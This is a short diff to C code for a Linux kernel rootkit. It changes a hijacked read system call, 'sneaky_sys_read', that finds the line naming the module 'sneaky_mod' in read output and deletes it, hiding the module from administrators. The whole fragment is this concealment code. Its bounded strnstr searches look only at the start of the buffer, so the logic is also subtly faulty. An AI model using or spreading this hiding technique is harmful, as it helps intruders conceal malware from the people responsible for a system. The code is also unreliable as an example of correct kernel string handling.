@@ -105,12 +105,12 @@ asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
     find = strnstr(buf, "sneaky_mod", strlen("sneaky_mod")); //10
     if (find != NULL) {
         printk(KERN_INFO"find sneaky_mod: %s \n", find);
-        end = strnstr(find, "\n", strlen("\n"));
-        printk(KERN_INFO"strlen(\"\\n\"): %zu \n", strlen("\n"));
+        end = strnstr(find, "\n", 1); //1
+        printk(KERN_INFO"try to find 'enter' ing...\n");
         if (end != NULL) {
             printk(KERN_INFO"find end of sneaky_mod: %s \n", end);
-            memmove(find, end + strlen("\n"), nread - (end + strlen("\n") - find));
-            nread -= (end + strlen("\n") - find);
+            memmove(find, end + strlen("\n"), nread - (end + 1 - find));
+            nread -= (end + 1 - find);
         }
     }
     return nread;
